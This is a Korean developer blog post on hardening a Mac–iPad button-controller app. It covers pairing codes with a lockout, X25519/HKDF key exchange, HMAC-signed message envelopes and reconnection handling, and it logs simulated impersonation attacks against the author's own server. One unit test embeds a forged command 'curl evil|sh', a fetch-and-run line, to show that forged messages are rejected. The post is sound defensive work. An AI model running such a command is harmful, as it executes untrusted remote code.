---
title: StreamDeck (5) 아무나 내 맥을 못 건드리게 하는 4자리 숫자, 키 교환, 메시지마다 붙이는 서명
writer: Harold
date: 2026-10-19 18:40:00 +0900
categories: [StreamDeck]
tags: [CryptoKit, X25519, HKDF, HMAC, Keychain, Network]

toc: true
toc_sticky: true
published: true
---

버튼에 명령어를 올릴 수 있다는 건, 같은 와이파이에 붙은 누구든 내 맥에 아무 명령이나 시킬 수 있다는 뜻이기도 하다. 그래서 처음 연결하는 기기는 맥 메뉴바에 뜬 4자리 숫자를 입력해야 붙게 했다. 이번 글은 이 허락 과정이다. 만든 뒤에 처음 보는 검토자에게 코드를 따로 맡겨서 구멍을 찾게 했는데, 생각보다 구멍이 많았다. 처음 버전, 거기서 나온 문제, 고친 과정을 순서대로 적었다. 맥 앱이 꺼졌다 켜졌을 때 아이패드가 스스로 다시 붙는 부분도 같이 다룬다.

---

## 숫자로 받는 허락과 그다음의 서명

처음 버전의 허락 과정은 두 갈래였다. 처음 보는 기기는 4자리 숫자로 허락받고, 그때 맥이 만든 비밀 값(토큰)을 받아 둔다. 한 번 허락받은 기기는 다음부터 숫자 없이 그 토큰으로 "내가 그 기기"라는 걸 증명한다.

증명할 때 토큰을 그대로 보내면, 와이파이에서 오가는 걸 누가 엿봤을 때 토큰을 그대로 가져다 쓸 수 있다. 그래서 맥이 매번 새 무작위 값(nonce)을 보내고, 아이패드는 토큰으로 그 값에 서명한 결과만 돌려주게 했다. 서명은 CryptoKit의 HMAC-SHA256으로 만든다. 같은 키와 같은 글자를 넣으면 항상 같은 결과가 나오고, 키를 모르면 그 결과를 만들 수 없다. 맥도 저장해 둔 토큰으로 똑같이 계산해서 결과가 같으면 허락한다. nonce가 매번 바뀌니 한 번 엿본 서명은 다음 번에 못 쓴다.

```swift
// SecureSession.swift (DeckKit)
/// HMAC-SHA256 결과를 소문자 16진수 글자로. ESP32(mbedtls)에서도 같은 값을 만들 수 있다.
public func hmacHex(key: SymmetricKey, _ message: String) -> String {
    HMAC<SHA256>.authenticationCode(for: Data(message.utf8), using: key).map { String(format: "%02x", $0) }.joined()
}
```

계산이 맞는지는 HMAC-SHA256의 공개된 예시 값으로 테스트했다. 나중에 ESP32에서도 같은 계산을 해야 해서, 결과를 어디서나 똑같이 비교할 수 있는 16진수 글자로 맞췄다.

```swift
// SecureSessionTests.swift (DeckKit)
@Test func hmacHexMatchesPublicTestVector() {
    // HMAC-SHA256(key: "key", data: "The quick brown fox jumps over the lazy dog") 공개 테스트 값
    #expect(hmacHex(key: SymmetricKey(data: Data("key".utf8)), "The quick brown fox jumps over the lazy dog")
            == "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8")
}
```

아이패드는 토큰을 Keychain에 저장한다. 맥은 허락한 기기 목록(기기 ID, 이름, 토큰)을 설정 파일에 같이 저장하고, 메뉴바에서 기기마다 "허락 취소"를 누를 수 있다. 맥은 접속마다 지금 어느 단계인지(`stage`)를 들고 있다가, 허락받기 전에 버튼 누르기나 설정 바꾸기가 오면 `unauthorized`만 돌려준다.

처음 보는 기기가 붙으면 아이패드에는 이 화면이 뜨고, 숫자는 맥 메뉴바에만 보인다.

![](https://pub-1fd8ca6711bd4f3f8b74d88a697b50f9.r2.dev/2026-10-19-StreamDeck-5/touchdeck-pairing.png)

---

## 끝없이 돌던 인사

아이패드 쪽을 만들다가 무한 반복이 생길 수 있는 경로를 발견했다. 맥은 이 기기를 기억하는데, 아이패드 쪽 Keychain에서 토큰이 사라진 경우다(앱을 지웠다 다시 깔면 생길 수 있다).

1. 아이패드가 `hello`를 보낸다
2. 맥은 허락한 기기라서 `challenge`를 보낸다
3. 아이패드는 토큰이 없어서 증명을 못 만든다. 처음엔 여기서 빈 숫자로 `pair`를 보냈다
4. 맥은 증명을 기다리는 단계라 `pair`를 받을 수 없어서 `unauthorized`를 보낸다
5. 아이패드는 `unauthorized`를 받으면 다시 `hello`를 보낸다
6. 다시 2번으로

증명이 틀렸을 때 맥이 `unauthorized`로 돌려보내는 대신 숫자로 다시 허락받게 바꿨다. 아이패드는 토큰이 없으면 빈 증명을 보내고, 맥은 증명이 틀리니 새 숫자를 띄운다.

```swift
// DeckServer.swift (맥)
case (.awaitingAuth, .auth(let proof)):
    guard let deviceId = session.deviceId else { return }
    if let keys = session.pendingKeys, keys.clientProof == proof {
        authorize(session, keys: keys)
    } else {
        // 증명이 틀리면(기기가 토큰을 잃었거나 가짜) 다시 숫자로 허락받게 한다.
        // 기존 허락은 지우지 않는다. 남이 내 기기 ID로 틀린 증명을 보내 허락을 끊는 걸 막기 위해.
        beginPairing(session, deviceId: deviceId, deviceName: session.deviceName ?? "새 기기")
    }
```

증명이 틀렸다고 허락 목록에서 지우면 안 됐다. 기기 ID는 `hello`에 그대로 실려 다니니, 남이 내 아이패드 ID로 틀린 증명을 보내기만 해도 내 아이패드 허락을 끊을 수 있게 된다.

---

## 1만 번 찍으면 들어올 수 있던 숫자

검토자가 가장 먼저 짚은 게 이거다. 처음 버전은 숫자를 5번 틀리면 숫자를 새로 바꾸고 횟수를 다시 5로 채웠다. 게다가 `hello`를 새로 보낼 때마다 횟수가 처음으로 돌아갔다. 결국 횟수 제한이 없는 것과 같았다. 4자리는 경우의 수가 1만 개뿐이라, 같은 와이파이의 노트북이 스크립트로 0000부터 9999까지 쉬지 않고 넣어 보면 금방 끝나는 양이다(검토자는 몇 초에서 1분 정도로 봤고, 직접 재 보지는 않았다). 들어오는 순간 버튼에 아무 명령이나 올리고 누를 수 있으니, 처음에 "실패로 보는 것"으로 정해 둔 바로 그 상황이었다.

규칙을 이렇게 바꿨다.

- 틀린 횟수는 다시 인사하거나 기기 ID를 바꿔도 이어진다
- 합쳐서 5번 틀리면 잠긴다. 숫자도 지워지고, 잠겨 있는 동안은 맞는 숫자도 거절한다
- 해롤드가 맥 메뉴에서 "새 기기 허락 다시 받기"를 눌러야 풀린다
- 숫자를 받은 기기가 아닌 다른 기기가 보낸 건 맞춰 보지도 않고, 횟수도 쓰지 않는다

테스트를 먼저 바꾸고 실패하는 걸 본 다음 고쳤다. 아래 `submit`은 테스트 안의 도우미로, 아이패드처럼 친 숫자로 증명을 만들어 맥 쪽 판정에 넣는다(증명 만드는 법은 아래 키 교환에서 다룬다).

```swift
// PairingAuthorityTests.swift (DeckKit)
@Test func helloAgainDoesNotResetAttempts() throws {
    // 인사를 다시 할 때마다 횟수가 초기화되면 숫자를 무한히 찍어 볼 수 있다
    var a = PairingAuthority(trusted: [], random: { 1111 })
    var offer = try unwrap(a.beginPairing(deviceId: "d", deviceName: "d"))
    _ = try submit(&a, offer, code: "0000")
    _ = try submit(&a, offer, code: "0001")
    offer = try unwrap(a.beginPairing(deviceId: "d", deviceName: "d"))
    #expect(try submit(&a, offer, code: "0002") == .wrong(remaining: 2))
}
```

```swift
// Pairing.swift (DeckKit)
attemptsLeft -= 1
if attemptsLeft <= 0 {
    isLocked = true
    self.pending = nil
    currentCode = nil
    return .locked
}
return .wrong(remaining: attemptsLeft)
```

이걸 고친 직후(아직 키 교환을 넣기 전, 숫자를 그대로 보내던 때) 켜 둔 맥 서버에 스크립트로 직접 찍어 봤다. 세 번 틀리고, 다시 인사하고, 두 번 더 틀리고, 맞는 숫자(4821)를 넣고, 마지막으로 다른 기기 ID로 새로 인사했다.

```text
<- {"type":"needPairing"}
<- {"remaining":4,"type":"pairingFailed"}
<- {"remaining":3,"type":"pairingFailed"}
<- {"remaining":2,"type":"pairingFailed"}
<- {"type":"needPairing"}
<- {"remaining":1,"type":"pairingFailed"}
<- {"type":"pairingLocked"}
<- {"type":"pairingLocked"}
<- {"type":"pairingLocked"}
== 다른 기기 ID로 새로 인사
<- {"type":"pairingLocked"}
<- {"type":"pairingLocked"}
```

다섯 번째에서 잠기고, 그 뒤로는 맞는 숫자도 다른 기기 ID도 전부 거절됐다. 잠긴 상태는 맥 앱 메모리에만 있어서 맥 앱을 다시 켜도 풀린다. 맥 앱을 다시 켜는 건 내 맥 앞에 있는 사람만 할 수 있으니 괜찮다고 봤다.

같은 검토에서 하나가 더 나왔다. 처음 버전은 숫자를 기다리는 기기가 한 대뿐이라, 아이패드와 아이폰을 동시에 처음 연결하면 나중에 인사한 쪽이 숫자를 가져가고 먼저 인사한 쪽은 맥 메뉴에 숫자가 없는 채로 입력 화면에 멈춰 있었다. 이제 숫자를 받은 기기가 아닌 쪽이 증명을 보내면 맥이 그 기기에게 새 숫자를 다시 띄운다.

---

## 가짜 맥과 엿보기를 막는 키 교환과 봉투

검토자가 짚은 것 중 두 가지는 숫자 잠금으로는 해결이 안 됐다.

하나는 가짜 맥이다. 아이패드는 같은 와이파이에서 `_touchdeck._tcp`로 광고하는 맥에 붙는다. 누가 같은 서비스로 가짜 서버를 띄우면 아이패드가 거기 붙을 수 있다. 가짜 서버가 진짜 맥이 보낸 nonce를 아이패드에 그대로 넘기고, 아이패드가 만든 서명을 다시 진짜 맥에 넘기면, 진짜 맥은 가짜 서버의 연결을 허락해 버린다. 서명은 엿본 걸 나중에 다시 쓰는 건 막지만, 이렇게 중간에서 실시간으로 넘겨주는 건 못 막는다. 허락을 받고 나면 그다음 메시지에는 아무 표시가 없으니 가짜 서버가 마음대로 버튼을 만들고 누를 수 있었다.

다른 하나는 처음 허락받을 때 맥이 토큰을 `paired` 메시지에 담아 그대로 보냈다는 것이다. 그 순간을 엿보면 토큰을 그대로 얻는다. 처음엔 집 와이파이라 암호화까지는 안 하기로 정했는데, 둘 다 같은 와이파이의 누군가가 내 맥에 명령을 시킬 수 있는 길이라 막기로 했다.

방법을 고를 때 기준은 나중에 ESP32에서도 같은 방식으로 붙을 수 있어야 한다는 것이었다. 연결 전체를 암호화(TLS)하는 건 ESP32 쪽 WebSocket 라이브러리에서 다루기 번거롭다. 그래서 X25519(키 교환), HKDF(키 만들기), HMAC-SHA256(서명) 세 가지만 쓰기로 했다. 애플 쪽은 CryptoKit에 다 있고, ESP32가 쓰는 Mbed TLS 라이브러리에도 HKDF(`hkdf.h`)와 Curve25519가 들어 있다. 보드에서 실제로 켜져 있는지는 보드가 오면 확인해야 한다.

---

### 토큰을 보내지 않는 페어링

X25519는 두 쪽이 각자 비밀 키를 하나씩 만들고 공개 키만 주고받으면, 둘이 같은 공유 비밀을 계산할 수 있는 방식이다. 공개 키 두 개를 다 엿본 사람은 비밀 키가 없어서 이 공유 비밀을 계산하지 못한다.

그래서 페어링을 이렇게 바꿨다.

1. 맥이 숫자를 만들 때 임시 키도 새로 만든다. 숫자는 메뉴바에만 띄우고, 아이패드에는 공개 키만 보낸다(`needPairing`)
2. 아이패드도 임시 키를 만든다. 맥 공개 키와 자기 비밀 키로 공유 비밀을 계산하고, 사람이 친 숫자를 섞어 HKDF로 키 두 개를 만든다. 하나는 "같은 숫자를 안다"는 증명용, 하나는 앞으로 쓸 토큰이다
3. 아이패드는 자기 공개 키와 증명만 보낸다(`pair`). 숫자는 보내지 않는다
4. 맥도 같은 계산을 해서 증명이 맞으면 같은 토큰을 저장하고, 자기도 같은 숫자를 안다는 증명을 돌려준다(`paired`). 토큰은 보내지 않는다
5. 아이패드는 맥 증명까지 맞을 때만 토큰을 저장한다

```swift
// SecureSession.swift (DeckKit)
public static func derive(privateKey: Curve25519.KeyAgreement.PrivateKey, peerPublicKey: Data, code: String,
                          macPublicKey: Data, clientPublicKey: Data) throws -> Derived {
    let peer = try Curve25519.KeyAgreement.PublicKey(rawRepresentation: peerPublicKey)
    let shared = try privateKey.sharedSecretFromKeyAgreement(with: peer)
    // 두 공개 키를 같이 넣어서, 다른 키 쌍으로 만든 결과와 섞일 수 없게 한다
    let transcript = macPublicKey + clientPublicKey
    let salt = Data(code.utf8)
    let confirmKey = shared.hkdfDerivedSymmetricKey(using: SHA256.self, salt: salt,
                                                    sharedInfo: Data("touchdeck confirm".utf8) + transcript, outputByteCount: 32)
    let token = shared.hkdfDerivedSymmetricKey(using: SHA256.self, salt: salt,
                                               sharedInfo: Data("touchdeck token".utf8) + transcript, outputByteCount: 32)
    return Derived(token: token.withUnsafeBytes { Data($0) },
                   clientProof: hmacHex(key: confirmKey, "client"),
                   macProof: hmacHex(key: confirmKey, "mac"))
}
```

맥과 아이패드가 각자 이 함수를 부르는데, 맥은 자기 비밀 키와 아이패드 공개 키를, 아이패드는 자기 비밀 키와 맥 공개 키를 넣는다. 숫자가 같으면 결과가 같고, 다르면 증명도 토큰도 달라진다. 테스트로 세 가지를 먼저 정했다. 같은 숫자면 양쪽 토큰이 같은지, 다른 숫자면 증명이 다른지, 엿본 사람이 공개 키 두 개와 숫자까지 알아도 자기 비밀 키로는 같은 토큰을 못 만드는지다.

```swift
// SecureSessionTests.swift (DeckKit)
@Test func eavesdropperWithBothPublicKeysAndCodeCannotDeriveToken() throws {
    // 엿본 사람은 두 공개 키를 다 알고, 숫자도 알아냈다고 쳐도 자기 비밀 키로는 같은 토큰을 못 만든다
    let mac = PairingCrypto.newPrivateKey()
    let ipad = PairingCrypto.newPrivateKey()
    let eve = PairingCrypto.newPrivateKey()
    let m = mac.publicKey.rawRepresentation, c = ipad.publicKey.rawRepresentation
    let real = try PairingCrypto.derive(privateKey: mac, peerPublicKey: c, code: "4821", macPublicKey: m, clientPublicKey: c)
    let guess = try PairingCrypto.derive(privateKey: eve, peerPublicKey: c, code: "4821", macPublicKey: m, clientPublicKey: c)
    #expect(real.token != guess.token)
}
```

시뮬레이터에서 실제로 페어링했을 때 맥이 받은 `pair` 메시지다. 공개 키와 증명뿐이다.

```text
[server] <- iPad Pro 11-inch (M5) {"proof":"74290205ccc4cb16787f2fd6715e67ad64c6c5f61e992d72b35cf19a7b91e644","publicKey":"Y3OWDMLGuKb9BxCvMRF7SKgvYpv92h5uvOEVC5PIyFA=","type":"pair"}
```

---

### 맥이 먼저 하는 증명

다시 붙을 때도 바꿨다. 처음 버전은 맥이 nonce만 보내고 아이패드만 증명했다. 그러면 아이패드는 상대가 진짜 맥인지 알 방법이 없다. 이제 아이패드도 `hello`에 자기 nonce를 실어 보내고, 맥이 두 nonce와 토큰으로 만든 증명을 먼저 보낸다(`challenge`). 아이패드는 그 증명이 맞을 때만 자기 증명을 보낸다. 토큰을 모르는 가짜 맥은 맥 증명을 만들 수 없어서 여기서 걸린다.

```swift
// DeckClient.swift (iOS)
case .challenge(let nonce, let proof):
    macNonce = nonce
    guard let token = KeychainStore.token().flatMap({ Data(base64Encoded: $0) }) else {
        // 토큰이 없으면(앱을 지웠다 깔았을 때) 빈 증명을 보낸다. 맥이 숫자로 다시 허락받게 한다.
        return send(.auth(proof: ""))
    }
    let keys = SessionKeys(token: token, clientNonce: clientNonce, macNonce: nonce)
    // 맥이 먼저 토큰을 안다는 걸 증명해야 내 증명을 보낸다
    guard keys.macProof == proof else { return rejectMac("challenge proof") }
    send(.auth(proof: keys.clientProof))
    secure = SecureChannel(keys: keys, role: .client)
```

다만 진짜 맥이 만든 증명을 가짜 서버가 중간에서 그대로 넘겨주면 이 확인은 통과한다. 그건 다음 봉투가 막는다.

---

### 메시지마다 붙이는 서명

허락받은 뒤에 오가는 모든 메시지를 봉투에 넣었다. 봉투에는 원래 메시지(`body`), 번호(`seq`), 서명(`mac`)이 들어간다. 서명 키는 토큰과 이번 접속의 두 nonce로 HKDF를 돌려 만든 이번 접속 전용 키고, 아이패드→맥과 맥→아이패드 방향의 키가 따로 있다.

```swift
// SecureSession.swift (DeckKit)
public mutating func seal(_ body: String) -> String {
    sentSeq += 1
    let envelope = Envelope(seq: sentSeq, body: body, mac: hmacHex(key: sendKey, "\(sentSeq)|\(body)"))
    // 생략 (JSON 글자로 바꾸기)
}

public mutating func open(_ text: String) throws -> String {
    guard let envelope = try? JSONDecoder().decode(Envelope.self, from: Data(text.utf8)), envelope.type == "secure" else {
        throw OpenError.notSecure
    }
    guard hmacHex(key: receiveKey, "\(envelope.seq)|\(envelope.body)") == envelope.mac else { throw OpenError.badSignature }
    guard envelope.seq > receivedSeq else { throw OpenError.replayed }
    receivedSeq = envelope.seq
    return envelope.body
}
```

버튼 하나를 누르면 실제로 이렇게 간다.

```text
{"body":"{\"index\":0,\"page\":0,\"type\":\"press\"}","mac":"8e52f8a1139694633f8f5033707a431c0024f8bfd856cf71dadbe0fc5a973dc4","seq":2,"type":"secure"}
```

중간에서 넘겨주기만 하는 가짜 서버는 토큰을 모르니 이 키도 없다. 그래서 메시지를 새로 지어내면 서명이 틀리고, `body`를 한 글자라도 바꿔도 서명이 틀리고, 같은 봉투를 다시 보내면 번호에서 걸린다. 아이패드가 보낸 봉투를 아이패드에게 되돌려 보내는 것도 방향별 키가 달라서 안 열린다. 가짜 서버가 할 수 있는 건 아이패드의 진짜 메시지를 그대로 넘기거나 버리는 것뿐이다. 맥은 허락 뒤에 서명이 틀린 메시지가 오면 그 연결을 끊고, 아이패드는 서명 없는 버튼 배치나 결과를 무시한다.

```swift
// SecureSessionTests.swift (DeckKit)
@Test func relayWithoutTokenCannotForge() throws {
    // 가짜 맥은 토큰을 몰라서, 같은 nonce를 봤어도 다른 키로 서명하게 된다
    var (_, mac) = pair()
    var forger = SecureChannel(keys: SessionKeys(token: Data(repeating: 9, count: 32), clientNonce: "c", macNonce: "m"), role: .client)
    let forged = forger.seal(#"{"type":"setButton","page":0,"index":0,"button":{"label":"x","action":{"kind":"command","command":"curl evil|sh"}}}"#)
    #expect(throws: SecureChannel.OpenError.badSignature) { try mac.open(forged) }
}
```

(이 봉투는 나중에 숫자 키패드를 넣으면서 서명만 하던 데서 내용까지 숨기는 암호화로 바뀐다. 6편에 적었다.)

아이패드는 `needPairing`을 받아도 기존 토큰을 바로 지우지 않게 했다. 새 페어링이 맥 증명까지 확인돼야 토큰을 바꾼다. 가짜 서버가 `needPairing`만 보내서 허락을 끊는 걸 막기 위해서다.

---

### 공격 흉내와 남는 한계

실제로 켜 둔 맥 서버에 스크립트로 아이패드 행세를 해 봤다. 아이패드 기기 ID를 그대로 쓰고, 증명은 아무 값이나 넣었다. 이어서 허락 없이 버튼 누르기를 보내고, 서명을 지어낸 봉투도 보냈다.

```text
== 아이패드 기기 ID로 행세
<- {"nonce":"561fc05697044ada74e1e5e21c030a88","proof":"7eee1068…","type":"challenge"}
<- {"nonce":"561fc05697044ada74e1e5e21c030a88","publicKey":"K9mh0laAr19+XoHq4FlVqmsZ7G8fE3KzBTSoHfjpKn0=","type":"needPairing"}
<- {"type":"unauthorized"}
trusted after attack: ['iPad Pro 11-inch (M5)']
```

엉터리 증명에는 허락 대신 숫자를 다시 요구했고, 허락 전 버튼 누르기는 거절됐고, 지어낸 봉투는 아예 무시됐다. 허락한 기기 목록도 그대로였다.

허락받기 전 접속에는 크기 상한도 뒀다. 허락 전에 오가는 인사, 증명, 페어링 메시지는 1KB도 안 되는데, 서버는 WebSocket 메시지를 16MB까지 받아 주고 접속 수도 제한이 없었다. 그래서 허락 전 메시지가 8KB를 넘으면 그 접속을 끊고, 허락 안 된 접속은 8개까지만 둔다. 9번째가 들어오면 새 접속을 거절하지 않고 가장 오래된 것을 끊는다. 반쯤 죽은 접속이 자리를 다 차지해도 내 아이패드가 다시 붙을 수 있게 하려는 것이다. 기기 이름은 상대가 정하는 값이라, 메뉴바 창이 길게 늘어나지 않게 32자에서 자른다.

```swift
// PreAuthLimits.swift (맥)
static func toDrop<T>(pending: [T]) -> [T] {
    Array(pending.prefix(max(0, pending.count - maxPending + 1)))
}
```

막지 못한 게 하나 남아 있다. 맨 처음 페어링하는 바로 그 순간에 가짜 서버가 중간에 끼는 경우다. 이때 가짜 서버는 아이패드와 직접 키 교환을 하게 되고, 아이패드가 보낸 증명을 받아서 숫자 1만 개를 혼자 다 넣어 보면 맞는 숫자를 알아낼 수 있다. 4자리처럼 짧은 숫자로 이것까지 막으려면 훨씬 복잡한 방식이 필요하다. 처음 한 번만 해당하는 일이라 이 부분은 그대로 두었다. SSH로 처음 보는 서버에 접속할 때 "이 서버를 믿겠냐"고 한 번 묻고 그다음부터 기억하는 것과 같은 믿음이다.

아래에서 네 가지 경우를 단계별로 눌러 볼 수 있다. 위가 아이패드 코드, 아래가 맥 코드고, 가운데가 그 단계에서 오간 메시지다. 지금 실행 중인 줄이 강조된다. 긴 값 일부는 실제로 오간 값 그대로다.

<style>
.td-pair-sim {
  width: 100%;
  height: 1165px;
  border: 1px solid rgba(120, 113, 108, 0.2);
  border-radius: 16px;
  box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
}
@media (max-width: 640px) { .td-pair-sim { height: 1660px; } }
</style>

<iframe
  class="td-pair-sim"
  src="/assets/demo/touchdeck_pairing_simulator.html"
  scrolling="no"
  loading="lazy"
></iframe>

---

## 맥을 꺼도 연결됨으로 남던 아이패드

맥 앱을 껐다 켰을 때 아이패드가 스스로 다시 붙는지 확인하다가 이상한 걸 봤다. 맥 앱을 다시 켰는데 서버 기록에 새 접속이 없었다. 아이패드는 계속 "연결됨"이었다. 끊긴 걸 모르고 있으니 다시 찾으러 가지도 않은 것이다.

재현 테스트를 먼저 만들었다. 서버가 연결을 받자마자 끊으면, 클라이언트가 끊겼다는 상태를 받기까지 얼마나 걸리는지 본다.

```swift
// WebSocketChannelTests.swift (DeckKit)
let start = ContinuousClock.now
var iterator = stream.makeAsyncIterator()
#expect(await iterator.next() == "closed")
#expect(ContinuousClock.now - start < .seconds(5), "끊긴 걸 5초 안에 알아차려야 한다")
```

```text
Test clientNoticesWhenServerGoesAway() recorded an issue: Expectation failed: ContinuousClock.now - start < .seconds(5)
Test run with 1 test in 0 suites failed after 60.017 seconds with 1 issue.
```

60초가 걸렸다. 원인은 받기 쪽이었다. 상대가 사라지면 `receiveMessage`는 오류와 함께 끝나는데, 연결 상태(`NWConnection.State`)는 `ready`인 채로 남는다. 내 코드는 오류가 나면 받기만 조용히 멈췄고, 연결 상태가 바뀌기만 기다리고 있었다. 받기가 오류나 닫기 신호로 끝나면 직접 연결을 닫게 바꿨다. 닫으면 상태가 `.cancelled`로 바뀌고, 아이패드는 그걸 보고 2초 뒤 처음부터 다시 맥을 찾는다.

```swift
// WebSocketChannel.swift (DeckKit)
private func receiveNext() {
    connection.receiveMessage { [weak self] content, context, _, error in
        guard let self else { return }
        let meta = context?.protocolMetadata(definition: NWProtocolWebSocket.definition) as? NWProtocolWebSocket.Metadata
        if let content, meta?.opcode == .text, let text = String(data: content, encoding: .utf8) {
            self.onText?(text)
        }
        // 상대가 사라지면 받기는 오류로 끝나지만 연결 상태는 ready로 남는다.
        // 직접 닫아서 .cancelled를 알려야 다시 찾으러 갈 수 있다.
        // 닫기 신호 없이 사라지면 오류도 내용도 없이 끝날 수 있다. 그것도 닫힘으로 본다.
        if error != nil || meta?.opcode == .close || (content == nil && meta == nil) {
            self.connection.cancel()
            return
        }
        self.receiveNext()
    }
}
```

테스트가 60초에서 바로 통과로 바뀌었다. 실제로 맥 앱을 끄고 5초 뒤에 찍은 아이패드 화면이 왼쪽, 다시 켜고 찍은 화면이 오른쪽이다.

| 맥 앱을 끈 뒤 | 다시 켠 뒤 |
|---|---|
| ![](https://pub-1fd8ca6711bd4f3f8b74d88a697b50f9.r2.dev/2026-10-19-StreamDeck-5/touchdeck-mac-quit.png) | ![](https://pub-1fd8ca6711bd4f3f8b74d88a697b50f9.r2.dev/2026-10-19-StreamDeck-5/touchdeck-reconnected.png) |

끈 뒤에는 "같은 와이파이에서 맥을 찾는 중"으로 바뀌고 버튼이 흐려진다. 다시 켜고 약 3초 만에 아이패드가 `hello`, `challenge`, `auth`를 거쳐 다시 허락받고 "연결됨"으로 돌아왔다. 숫자는 다시 묻지 않았다. 키 교환과 봉투를 넣은 뒤에 다시 해 봐도 똑같이 약 3초였다.

이건 맥 앱을 끈 경우라서 맥이 연결을 깔끔하게 닫아 준다. 검토자는 맥이 잠들거나 와이파이가 끊긴 경우는 닫기 신호조차 안 와서 여전히 몇 분 동안 모를 거라고 짚었다. 그래서 연결 설정에 TCP keepalive를 켰다. 5초 동안 아무것도 안 오면 2초 간격으로 3번 상대가 살아 있는지 물어보고, 대답이 없으면 연결을 끊는다. 대략 11초 안에 알아챈다. 보내기가 실패했을 때도 연결을 닫게 했다.

```swift
// WebSocketChannel.swift (DeckKit)
// 맥이 잠들거나 와이파이가 끊기면 닫기 신호 없이 연결이 죽는다.
// 5초 조용하면 2초 간격으로 3번 확인해서, 약 11초 안에 끊긴 걸 알아챈다.
let tcp = NWProtocolTCP.Options()
tcp.enableKeepalive = true
tcp.keepaliveIdle = 5
tcp.keepaliveInterval = 2
tcp.keepaliveCount = 3
let params = NWParameters(tls: nil, tcp: tcp)
```

맥을 실제로 잠재우거나 공유기를 꺼서 11초 안에 알아채는지는 아직 확인 못 했다.

---

## 참고자료

- [Curve25519.KeyAgreement (CryptoKit, Apple)](https://developer.apple.com/documentation/cryptokit/curve25519/keyagreement)
- [sharedSecretFromKeyAgreement(with:) (Apple)](https://developer.apple.com/documentation/cryptokit/curve25519/keyagreement/privatekey/sharedsecretfromkeyagreement(with:))
- [SharedSecret.hkdfDerivedSymmetricKey(using:salt:sharedInfo:outputByteCount:) (Apple)](https://developer.apple.com/documentation/cryptokit/sharedsecret/hkdfderivedsymmetrickey(using:salt:sharedinfo:outputbytecount:))
- [HKDF (CryptoKit, Apple)](https://developer.apple.com/documentation/cryptokit/hkdf)
- [HMAC (CryptoKit, Apple)](https://developer.apple.com/documentation/cryptokit/hmac)
- [RFC 7748: X25519](https://www.rfc-editor.org/rfc/rfc7748)
- [RFC 5869: HKDF](https://www.rfc-editor.org/rfc/rfc5869)
- [Mbed TLS (ESP32 쪽, ESP-IDF 문서)](https://docs.espressif.com/projects/esp-idf/en/stable/esp32/api-reference/protocols/mbedtls.html)
- [Keychain Services (Apple)](https://developer.apple.com/documentation/security/keychain-services)
- [NWConnection.receiveMessage(completion:) (Apple)](https://developer.apple.com/documentation/network/nwconnection/receivemessage(completion:))
- [MenuBarExtra (Apple)](https://developer.apple.com/documentation/swiftui/menubarextra)
